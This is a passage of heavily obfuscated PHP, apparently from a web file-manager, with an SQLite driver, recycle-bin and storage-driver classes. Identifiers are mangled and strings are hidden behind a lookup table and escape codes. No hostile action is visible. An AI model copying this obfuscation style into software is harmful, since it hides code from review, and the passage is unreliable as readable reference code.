$this->config = $ë— š€„; if (empty($this->config[$°’ã¼Õ[17]])) { $this->config[$°’ã¼Õ[17]] = array(); } } } public function connect($ºİò¶Æ = '', $ıê–ôËõ = 0) { $õøÛî‹Æ =& $_SERVER[÷ôÚîå]; if (!isset($this->linkID[$ıê–ôËõ])) { if (empty($ºİò¶Æ)) { $ºİò¶Æ = $this->config; } $this->linkID[$ıê–ôËõ] = new SQLite3($ºİò¶Æ[$õøÛî‹Æ[21]]); if (!$this->linkID[$ıê–ôËõ]) { think_exception($this->linkID[$ıê–ôËõ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ıê–ôËõ]->busyTimeout(30000); if (1 != think_config($õøÛî‹Æ[22])) { unset($this->config); } } return $this->linkID[$ıê–ôËõ]; } public function free() { $this->queryID = null; } public function query($‚ŞÕºµ¨) { $û¹ëÂŠ =& $_SERVER[÷ôÚîå]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‚ŞÕºµ¨; if ($this->queryID) { $this->free(); } think_action_status($û¹ëÂŠ[23], 1); think_status($û¹ëÂŠ[24]); $this->queryID = $this->_linkID->query($‚ŞÕºµ¨); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $³Å–ü = $this->getAll(); $this->numRows = count($³Å–ü); return $³Å–ü; } } public function execute($ÆòõíÊú) { $šÚñ‡î =& $_SERVER[÷ôÚîå]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÆòõíÊú; if ($this->queryID) { $this->free(); } think_action_status($šÚñ‡î[25], 1); think_status($šÚñ‡î[24]); $öÙ¢ï½´ = $this->_linkID->exec($ÆòõíÊú); $this->debug(); if (!1 === $öÙ¢ï½´) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[÷ôÚîå][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Š‹ê÷ñš = $this->_linkID->query($_SERVER[÷ôÚîå][27]); if (!$Š‹ê÷ñš) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $á‹µí€„ = $this->_linkID->query($_SERVER[÷ôÚîå][28]); if (!$á‹µí€„) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÛÖš¤‹ù = array(); while ($åÉŸì¼Ø = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ÛÖš¤‹ù[] = $åÉŸì¼Ø; } $this->queryID->reset(); return $ÛÖš¤‹ù; } public function getFields($»ü£Àæå) { $¿ğÍØŠ¼ =& $_SERVER[÷ôÚîå]; $âñ’ßª¾ = $this->query($¿ğÍØŠ¼[29] . $»ü£Àæå . $¿ğÍØŠ¼[30]); $İ´¢¹¥ = array(); if ($âñ’ßª¾) { foreach ($âñ’ßª¾ as $’¼†î‰© => $à†ÇËÇÈ) { $İ´¢¹¥[$à†ÇËÇÈ[$¿ğÍØŠ¼[32]]] = array($¿ğÍØŠ¼[32] => $à†ÇËÇÈ[$¿ğÍØŠ¼[32]], $¿ğÍØŠ¼[33] => $à†ÇËÇÈ[$¿ğÍØŠ¼[33]], $¿ğÍØŠ¼[35] => (bool) ($à†ÇËÇÈ[$¿ğÍØŠ¼[35]] === $¿ğÍØŠ¼[12]), $¿ğÍØŠ¼[37] => $à†ÇËÇÈ[$¿ğÍØŠ¼[56]], $¿ğÍØŠ¼[39] => (bool) $à†ÇËÇÈ[$¿ğÍØŠ¼[57]], $¿ğÍØŠ¼[42] => (bool) $à†ÇËÇÈ[$¿ğÍØŠ¼[57]]); } } return $İ´¢¹¥; } public function getTables($¸ÅÊ¶¬ = '') { $¿ùÚ²’Ÿ =& $_SERVER[÷ôÚîå]; $æØ¥™½ = $this->query($¿ùÚ²’Ÿ[45] . $¿ùÚ²’Ÿ[46] . $¿ùÚ²’Ÿ[47]); $¦İÒ²æÂ = array(); foreach ($æØ¥™½ as $•¦‡•şè => $†§œ³®…) { $¦İÒ²æÂ[$•¦‡•şè] = current($†§œ³®…); } return $¦İÒ²æÂ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÍÉó²ä‚ =& $_SERVER[÷ôÚîå]; $this->error = $this->_linkID->lastErrorMsg(); if ($ÍÉó²ä‚[12] != $this->queryStr) { $this->error .= LNG($ÍÉó²ä‚[48]) . $this->queryStr; } think_trace($this->error, $ÍÉó²ä‚[12], $ÍÉó²ä‚[49]); return $this->error; } public function escapeString($ß¢¯Û›ò) { $²›Ú¼ÒÖ =& $_SERVER[÷ôÚîå]; if ($this->_linkID) { return $this->_linkID->escapeString($ß¢¯Û›ò); } return str_ireplace($²›Ú¼ÒÖ[58], $²›Ú¼ÒÖ[59], $ß¢¯Û›ò); } public function parseLimit($ÈßîÊÌ•) { $óûû¢à» =& $_SERVER[÷ôÚîå]; $ˆ³ššæ = $óûû¢à»[12]; if (!empty($ÈßîÊÌ•)) { $ÈßîÊÌ• = explode($óûû¢à»[50], $ÈßîÊÌ•); if (count($ÈßîÊÌ•) > 1) { $ˆ³ššæ .= $óûû¢à»[51] . $ÈßîÊÌ•[1] . $óûû¢à»[52] . $ÈßîÊÌ•[0] . $óûû¢à»[53]; } else { $ˆ³ššæ .= $óûû¢à»[51] . $ÈßîÊÌ•[0] . $óûû¢à»[53]; } } return $ˆ³ššæ; } } goto F°Ó«¢½Í; eêÜƒ†¨œØ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\x72\143\145\137\x72\145\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\162\145\x61\x74\x65\x54\x69\x6d\x65", "\x74\151\x6d\145", "\151\156\163\145\x72\164", "\146\165\x6e\x63\164\151\157\156")); public function listData($ÄÆôåà = false) { $îğƒ„èÕ =& $_SERVER[÷ôÚîå]; $ÄÆôåà = $ÄÆôåà ? $ÄÆôåà : USER_ID; $Ê‰Ş§î = $this->where(array($îğƒ„èÕ[1770] => $ÄÆôåà))->select(); return array_to_keyvalue($Ê‰Ş§î, $îğƒ„èÕ[12], $îğƒ„èÕ[203]); } public function moveToRecycle($ÁÕÎÑ‡Ê) { $²¤€íÓ¤ =& $_SERVER[÷ôÚîå]; $é¬Ùí×© = Model($²¤€íÓ¤[1429]); $ËĞùâÌ = $é¬Ùí×©->sourceInfo($ÁÕÎÑ‡Ê); if (!$ËĞùâÌ || $ËĞùâÌ[$²¤€íÓ¤[514]] == $²¤€íÓ¤[101]) { return; } $¤ÈêÖ§ = array($²¤€íÓ¤[500] => $ÁÕÎÑ‡Ê, $²¤€íÓ¤[1770] => USER_ID, $²¤€íÓ¤[657] => $ËĞùâÌ[$²¤€íÓ¤[200]], $²¤€íÓ¤[658] => $ËĞùâÌ[$²¤€íÓ¤[578]], $²¤€íÓ¤[661] => $ËĞùâÌ[$²¤€íÓ¤[593]]); $this->add($¤ÈêÖ§); $this->recycleMove($ÁÕÎÑ‡Ê, 1); if ($ËĞùâÌ[$²¤€íÓ¤[494]] == $²¤€íÓ¤[101]) { $€Ôş™€È = array($²¤€íÓ¤[661] => array($²¤€íÓ¤[621], $ËĞùâÌ[$²¤€íÓ¤[593]] . $ÁÕÎÑ‡Ê . $²¤€íÓ¤[622])); $é¬Ùí×©->where($€Ôş™€È)->setField($²¤€íÓ¤[514], 1); } } public function clear() { $this->remove(!1); } public function remove($—øƒí”Û = false, $¿æÒ‚÷ù = false) { $‚…Ã°·Ì =& $_SERVER[÷ôÚîå]; $¿æÒ‚÷ù = $¿æÒ‚÷ù ? $¿æÒ‚÷ù : USER_ID; $ø°ª·¤‚ = Model($‚…Ã°·Ì[1429]); $ŒªÙüâ— = $this->listData($¿æÒ‚÷ù); $—øƒí”Û = $—øƒí”Û === !1 ? !1 : $—øƒí”Û; $ÊıËŒ§± = array(); foreach ($ŒªÙüâ— as $ŠƒÓÊ­) { if ($—øƒí”Û != !1 && !in_array($ŠƒÓÊ­, $—øƒí”Û)) { continue; } $‚€ÕÔŸö = $ø°ª·¤‚->sourceInfo($ŠƒÓÊ­); $ø°ª·¤‚->remove($ŠƒÓÊ­, !1); $¨íÛ¼çº = $‚€ÕÔŸö[$‚…Ã°·Ì[200]] . $‚…Ã°·Ì[11] . $‚€ÕÔŸö[$‚…Ã°·Ì[578]]; $ÊıËŒ§±[$¨íÛ¼çº] = array($‚…Ã°·Ì[657] => $‚€ÕÔŸö[$‚…Ã°·Ì[200]], $‚…Ã°·Ì[578] => $‚€ÕÔŸö[$‚…Ã°·Ì[578]]); $this->where(array($‚…Ã°·Ì[203] => $ŠƒÓÊ­))->delete(); } foreach ($ÊıËŒ§± as $âÓ–ï) { $ø°ª·¤‚->targetSpaceUpdate($âÓ–ï[$‚…Ã°·Ì[200]], $âÓ–ï[$‚…Ã°·Ì[578]]); } } public function restore($çğúÅ¾ê = false) { $•ÊÖå² = $this->listData(); $this->_restoreSource($•ÊÖå², $çğúÅ¾ê); } public function removeUserAll($íˆõì÷ü) { $this->remove(!1, $íˆõì÷ü); } public function restoreItem($ö¦–ªˆ) { $this->_restoreSource(array($ö¦–ªˆ), array($ö¦–ªˆ)); } private function _restoreSource($å¼«„¿, $œä²ˆí¿) { $ô¤…¤Òº =& $_SERVER[÷ôÚîå]; $™‡é¥÷¬ = Model($ô¤…¤Òº[1429]); $œä²ˆí¿ = $œä²ˆí¿ == !1 ? !1 : $œä²ˆí¿; if (!$å¼«„¿) { return !0; } $´äƒ®± = array(); foreach ($å¼«„¿ as $ƒ¼Á­Ëè) { if ($œä²ˆí¿ != !1 && !in_array($ƒ¼Á­Ëè, $œä²ˆí¿)) { continue; } $Èí©ˆÅ = $™‡é¥÷¬->sourceInfo($ƒ¼Á­Ëè); $ÓÊ‘áÁ” = $™‡é¥÷¬->sourceInfo($Èí©ˆÅ[$ô¤…¤Òº[202]]); if ($ÓÊ‘áÁ”[$ô¤…¤Òº[514]] == $ô¤…¤Òº[101]) { continue; } $™‡é¥÷¬->lockMoveStart($ƒ¼Á­Ëè); $this->recycleMove($ƒ¼Á­Ëè, 0); if ($Èí©ˆÅ[$ô¤…¤Òº[494]] == $ô¤…¤Òº[101]) { $á– å´à = array($ô¤…¤Òº[661] => array($ô¤…¤Òº[621], $Èí©ˆÅ[$ô¤…¤Òº[593]] . $ƒ¼Á­Ëè . $ô¤…¤Òº[622])); $™‡é¥÷¬->where($á– å´à)->setField($ô¤…¤Òº[514], 0); $this->restoreFolderChildren($ƒ¼Á­Ëè, $å¼«„¿); } $this->where(array($ô¤…¤Òº[203] => $ƒ¼Á­Ëè))->delete(); $™‡é¥÷¬->folderSizeReset($Èí©ˆÅ[$ô¤…¤Òº[202]]); $´äƒ®±[] = $Èí©ˆÅ[$ô¤…¤Òº[202]]; if ($Èí©ˆÅ[$ô¤…¤Òº[494]] == $ô¤…¤Òº[101]) { $´äƒ®±[] = $ƒ¼Á­Ëè; } $™‡é¥÷¬->lockMoveEnd($ƒ¼Á­Ëè); } $™‡é¥÷¬->updateModifyTime($´äƒ®±); } private function restoreFolderChildren($ÈÒê¡, $µ×·€ğä) { $—×‘¼— =& $_SERVER[÷ôÚîå]; $çÅôÑ®à = Model($—×‘¼—[1429]); $æ¥íÔ±İ = array($—×‘¼—[203] => array($—×‘¼—[7], array())); foreach ($µ×·€ğä as $Àæœ‰ÅÜ) { if ($Àæœ‰ÅÜ == $ÈÒê¡) { continue; } if (!$çÅôÑ®à->isParentOf($ÈÒê¡, $Àæœ‰ÅÜ)) { continue; } $˜©şÕş‚ = $çÅôÑ®à->sourceInfo($Àæœ‰ÅÜ); if ($˜©şÕş‚[$—×‘¼—[494]] == $—×‘¼—[101]) { $æ¥íÔ±İ[] = array($—×‘¼—[661] => array($—×‘¼—[621], $˜©şÕş‚[$—×‘¼—[593]] . $Àæœ‰ÅÜ . $—×‘¼—[622])); } else { $æ¥íÔ±İ[$—×‘¼—[203]][1][] = $Àæœ‰ÅÜ; } } if (!$æ¥íÔ±İ[$—×‘¼—[203]][1]) { unset($æ¥íÔ±İ[$—×‘¼—[203]]); } if (!$æ¥íÔ±İ) { return; } if (is_array($æ¥íÔ±İ[$—×‘¼—[203]]) && is_array($æ¥íÔ±İ[$—×‘¼—[203]][1])) { $æ¥íÔ±İ[$—×‘¼—[203]][1] = array_unique($æ¥íÔ±İ[$—×‘¼—[203]][1]); } $æ¥íÔ±İ[$—×‘¼—[1089]] = $—×‘¼—[2080]; $çÅôÑ®à->where($æ¥íÔ±İ)->setField($—×‘¼—[514], 1); } private function recycleMove($¥³ú¶í¹, $¯ÛøÅ÷ = 1) { $ÂÖÎ¥Õ =& $_SERVER[÷ôÚîå]; $Ä•Õ‘³ = Model($ÂÖÎ¥Õ[1429]); $éûƒï¶ = Model($ÂÖÎ¥Õ[2301]); $ª¬çÈò´ = array($ÂÖÎ¥Õ[203] => $¥³ú¶í¹); if ($¯ÛøÅ÷) { $Ä•Õ‘³->where($ª¬çÈò´)->setField($ÂÖÎ¥Õ[514], 1); $éûƒï¶->eventRecycle($¥³ú¶í¹, $ÂÖÎ¥Õ[2302]); } else { $ˆ–šìÔ = $Ä•Õ‘³->where($ª¬çÈò´)->find(); $ÂğŸ°œ = $ˆ–šìÔ[$ÂÖÎ¥Õ[494]] == $ÂÖÎ¥Õ[101]; $ïãÜ¸™Ä = $Ä•Õ‘³->fileNameAuto($ˆ–šìÔ[$ÂÖÎ¥Õ[202]], $ˆ–šìÔ[$ÂÖÎ¥Õ[32]], REPEAT_RENAME_FOLDER, $ÂğŸ°œ); if ($ïãÜ¸™Ä != $ˆ–šìÔ[$ÂÖÎ¥Õ[32]]) { $Ä•Õ‘³->rename($¥³ú¶í¹, $ïãÜ¸™Ä); } $Ä•Õ‘³->where($ª¬çÈò´)->setField($ÂÖÎ¥Õ[514], 0); $éûƒï¶->eventRecycle($¥³ú¶í¹, $ÂÖÎ¥Õ[2303]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\x73\x6f\165\162\143\145\123\x65\x63\x72\145\x74\114\x69\163\164"; public $field = array("\x73\x6f\x75\x72\143\x65\x49\104", "\164\171\x70\145\111\104", "\143\162\x65\141\164\x65\x55\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\163\x74\157\x72\141\147\145\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\163\151\172\x65\115\x61\170", "\x73\x79\x73\164\145\x6d", "\x64\145\x66\x61\165\x6c\x74", "\x64\x72\x69\x76\145\x72", "\x63\x6f\156\146\151\147"); public function listData($Äàî¬¿ = false, $‘ƒöì€è = "\155\x6f\x64\151\146\171\x54\151\155\145", $€²×¶›ƒ = false) { $ÊçÙ‘Ó =& $_SERVER[÷ôÚîå]; $©àÊ±ˆÎ = parent::listData($Äàî¬¿, $‘ƒöì€è, $€²×¶›ƒ); if ($Äàî¬¿) { return $©àÊ±ˆÎ; } $šÈµÜŠö = array(); if ($GLOBALS[$ÊçÙ‘Ó[2304]]) { $šÈµÜŠö = $this->ioSizeUseGet(array_to_keyvalue($©àÊ±ˆÎ, $ÊçÙ‘Ó[12], $ÊçÙ‘Ó[484])); } foreach ($©àÊ±ˆÎ as $¾ªÓ‘×± => $…¿¶÷‘Š) { unset($©àÊ±ˆÎ[$¾ªÓ‘×±][$ÊçÙ‘Ó[6]]); $©àÊ±ˆÎ[$¾ªÓ‘×±][$ÊçÙ‘Ó[1966]] = isset($šÈµÜŠö[$…¿¶÷‘Š[$ÊçÙ‘Ó[484]]]) ? $šÈµÜŠö[$…¿¶÷‘Š[$ÊçÙ‘Ó[484]]] : 0; } return $©àÊ±ˆÎ; } public function ioSizeUseGet($ÖêœĞÚ) { $Ë…†ëû  =& $_SERVER[÷ôÚîå]; if (!$ÖêœĞÚ) { return array(); } $‹ÕîÒı¡ = $Ë…†ëû [2305] . implode($Ë…†ëû [50], $ÖêœĞÚ); $ƒÙ˜†ºã = Cache::get($‹ÕîÒı¡); if ($ƒÙ˜†ºã) { return $ƒÙ˜†ºã; } $´×Âö… = array($Ë…†ëû [907] => $Ë…†ëû [484], $Ë…†ëû [2306] => $Ë…†ëû [89]); $ë¾Æß”¯ = array($Ë…†ëû [907] => array($Ë…†ëû [7], $ÖêœĞÚ)); $ƒÙ˜†ºã = Model($Ë…†ëû [878])->field($´×Âö…)->where($ë¾Æß”¯)->group($Ë…†ëû [907])->select(); $ƒÙ˜†ºã = array_to_keyvalue($ƒÙ˜†ºã, $Ë…†ëû [484], $Ë…†ëû [89]); Cache::set($‹ÕîÒı¡, $ƒÙ˜†ºã, 600); return $ƒÙ˜†ºã; } public function getConfig($ª±úŞË½) { $Áü¬¶Ê² = parent::listData($ª±úŞË½); return json_decode($Áü¬¶Ê²[$_SERVER[÷ôÚîå][6]], !0); } public function update($·¨µÊ, $¿ÑÆÒ) { $‰ÑŒá³Ñ =& $_SERVER[÷ôÚîå]; $úŠÙò™î = $¿ÑÆÒ[$‰ÑŒá³Ñ[32]]; $Æ³üÀšƒ = array_to_keyvalue(parent::listData(), $‰ÑŒá³Ñ[32]); if (isset($Æ³üÀšƒ[$úŠÙò™î]) && $Æ³üÀšƒ[$úŠÙò™î][$‰ÑŒá³Ñ[484]] != $·¨µÊ) { return !1; } $this->checkPwd($·¨µÊ, $¿ÑÆÒ); if (isset($¿ÑÆÒ[$‰ÑŒá³Ñ[2307]]) && $¿ÑÆÒ[$‰ÑŒá³Ñ[2307]] == $‰ÑŒá³Ñ[101]) { $this->checkConfig($¿ÑÆÒ); } unset($¿ÑÆÒ[$‰ÑŒá³Ñ[2307]]); $•›ôÄä˜ = parent::update($·¨µÊ, $¿ÑÆÒ); if ($•›ôÄä˜ && $¿ÑÆÒ[$‰ÑŒá³Ñ[37]]) { $Ğª¤¢¾ = 0; foreach ($Æ³üÀšƒ as $¡¸Ğªı) { if ($¡¸Ğªı[$‰ÑŒá³Ñ[37]] && $¡¸Ğªı[$‰ÑŒá³Ñ[484]] != $·¨µÊ) { $Ğª¤¢¾ = $¡¸Ğªı[$‰ÑŒá³Ñ[484]]; parent::update($¡¸Ğªı[$‰ÑŒá³Ñ[484]], array($‰ÑŒá³Ñ[37] => 0)); } } $this->updateBackup($·¨µÊ, $Ğª¤¢¾); } return $•›ôÄä˜; } public function add($ş¢‘‹Ê¦) { $ø±õ†Æñ =& $_SERVER[÷ôÚîå]; $Ş¥ğñç€ = array_to_keyvalue(parent::listData(), $ø±õ†Æñ[32]); if (isset($Ş¥ğñç€[$ş¢‘‹Ê¦[$ø±õ†Æñ[32]]])) { return !1; } $this->checkConfig($ş¢‘‹Ê¦); $¿æ“ÜÒÎ = parent::insert($ş¢‘‹Ê¦); if ($¿æ“ÜÒÎ && $ş¢‘‹Ê¦[$ø±õ†Æñ[37]]) { foreach ($Ş¥ğñç€ as $Ï½×³³°) { if ($Ï½×³³°[$ø±õ†Æñ[37]]) { parent::update($Ï½×³³°[$ø±õ†Æñ[484]], array($ø±õ†Æñ[37] => 0)); } } } return $¿æ“ÜÒÎ; } public function updateBackup($×Çƒ¶³, $½¨¬ Š) { $ÍèÈ€À° =& $_SERVER[÷ôÚîå]; if (!$½¨¬ Š) { return; } $Úƒã£ª = Model($ÍèÈ€À°[837])->config(); if ($Úƒã£ª[$ÍèÈ€À°[1749]] != $ÍèÈ€À°[101] || $Úƒã£ª[$ÍèÈ€À°[841]] != $½¨¬ Š) { return; } $Ë»¸¤‹ = Model($ÍèÈ€À°[859])->get($ÍèÈ€À°[872]); $Ë»¸¤‹ = json_decode($Ë»¸¤‹, !0); if (!$Ë»¸¤‹) { return; } $Ë»¸¤‹[$ÍèÈ€À°[841]] = $×Çƒ¶³; Model($ÍèÈ€À°[859])->set(array($ÍèÈ€À°[872] => $Ë»¸¤‹)); } public function checkPwd($êİù“, &$«÷É¡à§) { $Ã¢’˜á„ =& $_SERVER[÷ôÚîå]; if (empty($«÷É¡à§[$Ã¢’˜á„[6]])) { return; } $Ë¡Û– = json_decode($«÷É¡à§[$Ã¢’˜á„[6]], !0); $Ûø©¹ãŠ = $Ã¢’˜á„[12]; $Õõ—ë— = array($Ã¢’˜á„[2308], $Ã¢’˜á„[2309], $Ã¢’˜á„[978]); foreach ($Õõ—ë— as $ÍéºòÌğ) { if (isset($Ë¡Û–[$ÍéºòÌğ])) { $Ûø©¹ãŠ = $ÍéºòÌğ; break; } } if (!$Ûø©¹ãŠ) { return; } $Úí¡©ÆÙ = $this->getConfig($êİù“); $ë¤ñÅŸî = $Úí¡©ÆÙ[$Ûø©¹ãŠ]; $ˆºñıÇ¦ = $Ë¡Û–[$Ûø©¹ãŠ]; if ($ˆºñıÇ¦ == str_repeat($Ã¢’˜á„[230], strlen($ë¤ñÅŸî))) { $Ë¡Û–[$Ûø©¹ãŠ] = $ë¤ñÅŸî; $«÷É¡à§[$Ã¢’˜á„[6]] = json_encode($Ë¡Û–); } else { if ($ˆºñıÇ¦ != $ë¤ñÅŸî) { $«÷É¡à§[$Ã¢’˜á„[2307]] = $Ã¢’˜á„[101]; } } } public function checkConfig(&$ÆâÂÃŸ, $©üøËµ² = false) { $êå¿Şõ¥ =& $_SERVER[÷ôÚîå]; $¼¹ÎíÔã = strtolower($ÆâÂÃŸ[$êå¿Şõ¥[108]]); $â˜–ëáó = json_decode($ÆâÂÃŸ[$êå¿Şõ¥[6]], !0); foreach ($â˜–ëáó as $âˆ’©Š¨ => $çÑŒêÊ€) { if (is_string($çÑŒêÊ€)) { $â˜–ëáó[$âˆ’©Š¨] = trim($çÑŒêÊ€); } } $â˜–ëáó[$êå¿Şõ¥[2310]] = rand_string(6); $“¡¸»ºÜ = $GLOBALS[$êå¿Şõ¥[6]][$êå¿Şõ¥[102]][$êå¿Şõ¥[915]]; $Íßëæğ´ = isset($“¡¸»ºÜ[$¼¹ÎíÔã]) ? $“¡¸»ºÜ[$¼¹ÎíÔã] : ucfirst($¼¹ÎíÔã); $¸áŸÒ¼½ = $êå¿Şõ¥[87] . $Íßëæğ´; if (!$Íßëæğ´ || !class_exists($¸áŸÒ¼½)) { if ($©üøËµ²) { return LNG($êå¿Şõ¥[2311]); } write_log(array($êå¿Şõ¥[2312], $ÆâÂÃŸ, get_caller_info()), $êå¿Şõ¥[225]); show_json(LNG($êå¿Şõ¥[2311]), !1, $ÆâÂÃŸ); } $„á‡ä‰â = new $¸áŸÒ¼½($â˜–ëáó); if (in_array($¼¹ÎíÔã, $„á‡ä‰â->objectDriver)) { try { if (!$„á‡ä‰â->isBucketCors() && !$„á‡ä‰â->setBucketCors()) { $ä™§Æê² = LNG($êå¿Şõ¥[2313]); $ä™§Æê² .= $êå¿Şõ¥[2314] . LNG($êå¿Şõ¥[2315]); } } catch (Exception $û‘ãÖÅ) { $ä™§Æê² = $û‘ãÖÅ->getMessage(); } if (isset($ä™§Æê²)) { return $this->_parseError($ä™§Æê², $¼¹ÎíÔã, $©üøËµ²); } if ($¼¹ÎíÔã == $êå¿Şõ¥[78] && !$„á‡ä‰â->checkRegion()) { return $this->_parseError(LNG($êå¿Şõ¥[2316]), $¼¹ÎíÔã, $©üøËµ²); } } $åüú³«î = rtrim($â˜–ëáó[$êå¿Şõ¥[1273]], $êå¿Şõ¥[8]) . $êå¿Şõ¥[8]; $‡İãŠ = $„á‡ä‰â->getPath($åüú³«î . $êå¿Şõ¥[1277]); try { if ($¼¹ÎíÔã == $êå¿Şõ¥[119]) { $„á‡ä‰â->mkdir($åüú³«î); } $ó•£ƒ° = $„á‡ä‰â->mkfile($‡İãŠ); if (!$ó•£ƒ°) { $ä™§Æê² = LNG($êå¿Şõ¥[2313]); } } catch (Exception $û‘ãÖÅ) { $ä™§Æê² = $û‘ãÖÅ->getMessage(); } if (isset($ä™§Æê²)) { return $this->_parseError($ä™§Æê², $¼¹ÎíÔã, $©üøËµ²); } $â˜–ëáó[$êå¿Şõ¥[1273]] = $åüú³«î; $ÆâÂÃŸ[$êå¿Şõ¥[6]] = json_encode($â˜–ëáó); $ÆâÂÃŸ[$êå¿Şõ¥[108]] = $Íßëæğ´; return !0; } private function _parseError($³şÅˆ½ö, $æ÷¤ËùÚ, $•‹Ï¬Ãª = false) { $ç…Ä‹‰û =& $_SERVER[÷ôÚîå]; if ($æ÷¤ËùÚ == $ç…Ä‹‰û[78] && stripos($³şÅˆ½ö, $ç…Ä‹‰û[2317])) { $·¥áÒ½¶ = explode($ç…Ä‹‰û[10], $³şÅˆ½ö); $ÑŒëèÚ  = isset($·¥áÒ½¶[1]) ? $·¥áÒ½¶[1] : $ç…Ä‹‰û[12]; $ñó±û• = array($ç…Ä‹‰û[2318] => LNG($ç…Ä‹‰û[2319]), $ç…Ä‹‰û[2320] => LNG($ç…Ä‹‰û[2321])); if (isset($ñó±û•[$ÑŒëèÚ ])) { $³şÅˆ½ö = $ñó±û•[$ÑŒëèÚ ]; } } if (stripos($³şÅˆ½ö, $ç…Ä‹‰û[2322]) === 0) { $‹˜§ÅÛÄ = strpos($³şÅˆ½ö, $ç…Ä‹‰û[188]); if ($‹˜§ÅÛÄ === !1) { $‹˜§ÅÛÄ = strpos($³şÅˆ½ö, $ç…Ä‹‰û[4]); } if ($‹˜§ÅÛÄ !== !1) { $³şÅˆ½ö = substr($³şÅˆ½ö, $‹˜§ÅÛÄ + 1); } } $³şÅˆ½ö = LNG($ç…Ä‹‰û[1280]) . $³şÅˆ½ö; if ($•‹Ï¬Ãª) { return $³şÅˆ½ö; } show_json($³şÅˆ½ö, !1); } public function driverListSystem() { $÷Î¢¸³ı =& $_SERVER[÷ôÚîå]; $¤ì“”Çô = parent::listData(); $ÌëÊ¾»ë = array(); foreach ($¤ì“”Çô as $İ¹·Ôíº) { unset($İ¹·Ôíº[$÷Î¢¸³ı[241]], $İ¹·Ôíº[$÷Î¢¸³ı[98]]); $İ¹·Ôíº[$÷Î¢¸³ı[6]] = json_decode($İ¹·Ôíº[$÷Î¢¸³ı[6]], !0); $ÌëÊ¾»ë[] = $İ¹·Ôíº; } return $ÌëÊ¾»ë; } public function defaultDriver() { $ÍçÜÉ¬š =& $_SERVER[÷ôÚîå]; $¤­Ó„á = parent::listData(); $èĞüß» = array_filter_by_field($¤­Ó„á, $ÍçÜÉ¬š[37], 1); $èĞüß» = $èĞüß»[0]; if ($èĞüß») { $èĞüß»[$ÍçÜÉ¬š[6]] = json_decode($èĞüß»[$ÍçÜÉ¬š[6]], !0); } return $èĞüß»; } public function driverInfo($ÛŠÈàÁ–) { $¾Éâë²¬ =& $_SERVER[÷ôÚîå]; $­×‰ÛØÊ = array_to_keyvalue(parent::listData(), $¾Éâë²¬[484]); if (!isset($­×‰ÛØÊ[$ÛŠÈàÁ–])) { return !1; } $Û› Úü¦ = $­×‰ÛØÊ[$ÛŠÈàÁ–]; $Û› Úü¦[$¾Éâë²¬[6]] = json_decode($Û› Úü¦[$¾Éâë²¬[6]], !0); return $Û› Úü¦; } public function remove($¾ªğÔİ) { $this->removeShareItems($¾ªğÔİ); return parent::remove($¾ªğÔİ); } public function removeWithFile($£²Å•Àş, $×µÑŞË·, $Û™‘¦©ò, $¡‚Ø§ş§ = false) { $Ó›Ä”Õï =& $_SERVER[÷ôÚîå]; $ÒÍ›çç = array($Ó›Ä”Õï[907] => $£²Å•Àş); $¿ã¸œ¹ú = Model($Ó›Ä”Õï[553])->where($ÒÍ›çç)->count(); $³ˆøéı = Model($Ó›Ä”Õï[553])->where($ÒÍ›çç)->sum($Ó›Ä”Õï[89]); $ĞÜÊ‚•É = $×µÑŞË· . $Ó›Ä”Õï[2323] . $£²Å•Àş; $›Ä‹ÜÈŸ = LNG($×µÑŞË· == $Ó›Ä”Õï[629] ? $Ó›Ä”Õï[2324] : $Ó›Ä”Õï[2325]); $îÔ¤«’Ï = new TaskFileTransfer($ĞÜÊ‚•É, $Ó›Ä”Õï[225], $¿ã¸œ¹ú, $›Ä‹ÜÈŸ . $Ó›Ä”Õï[471] . $Û™‘¦©ò[$Ó›Ä”Õï[32]] . $Ó›Ä”Õï[224] . $£²Å•Àş); $îÔ¤«’Ï->task[$Ó›Ä”Õï[852]] = (double) $³ˆøéı; $ò’Ö«œ« = KodIO::defaultDriver(); $‚Ş¢Óö› = $ò’Ö«œ«[$Ó›Ä”Õï[484]]; $ĞàüË¾Ê = $­É­ëøı = $Õ·Ä¼òÒ = array(); $ƒ´‚» = Model($Ó›Ä”Õï[240])->where($ÒÍ›çç)->field($Ó›Ä”Õï[2326])->select(); foreach ($ƒ´‚» as $±é–Äï) { $ê©·¥Ô• = $±é–Äï[$Ó›Ä”Õï[550]]; if ($¡‚Ø§ş§) { $­É­ëøı[] = $ê©·¥Ô•; continue; } $²ôŸÊƒ‘ = $±é–Äï[$Ó›Ä”Õï[97]]; $ É¢Òêé = get_path_father($²ôŸÊƒ‘); $Õ·Ä¼òÒ[] = $ É¢Òêé; $ É¢Òêé = str_replace("\173\151\157\72{$£²Å•Àş}\x7d\57", "\173\151\157\x3a{$‚Ş¢Óö›}\x7d\57", $ É¢Òêé); if (!IO::exist($²ôŸÊƒ‘)) { $ĞàüË¾Ê[] = $ê©·¥Ô•; $îÔ¤«’Ï->updateFileEnd($±é–Äï[$Ó›Ä”Õï[32]], $±é–Äï[$Ó›Ä”Õï[89]]); write_log($Ó›Ä”Õï[2327] . $²ôŸÊƒ‘, $Ó›Ä”Õï[1909]); continue; } $Ì‚ÉìåÕ = IO::move($²ôŸÊƒ‘, $ É¢Òêé, REPEAT_RENAME); if (!$Ì‚ÉìåÕ) { $­É­ëøı[] = 